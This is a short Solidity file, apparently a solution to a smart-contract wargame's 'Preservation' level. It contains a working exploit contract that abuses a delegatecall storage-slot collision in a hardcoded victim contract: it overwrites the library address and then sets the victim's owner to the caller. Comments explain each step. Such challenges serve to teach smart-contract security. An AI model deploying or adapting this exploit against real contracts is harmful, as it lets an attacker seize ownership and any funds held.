// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import "./Preservation.sol";
// change owner in slot 2  of the contract that uses this as a delegate call, needs to use same signature of the call being made in contract and mimic the storage slots
contract PreservationAttack{
    address bogus1; //slot 0
    address bogus2; //slot 1
    address public owner; //slot 2

    Preservation victim = Preservation(0xF47bc042aEc8A8e2552E93d7BbBafc4A36491D1e);

    function changeLibraryToThisAddress() public {
        victim.setFirstTime(uint256(uint160(address(this)))); // can no longer explicitly typecast so need to do it this way
        //after this resolves, can call contract.setFirstTime("12345") to make it delegate call setTime from console
    }

    function setTime(uint _time) public {
        owner = msg.sender; //update slot 2 to msg.sender in calling contract, which changes the owner to msg.sender
    }
}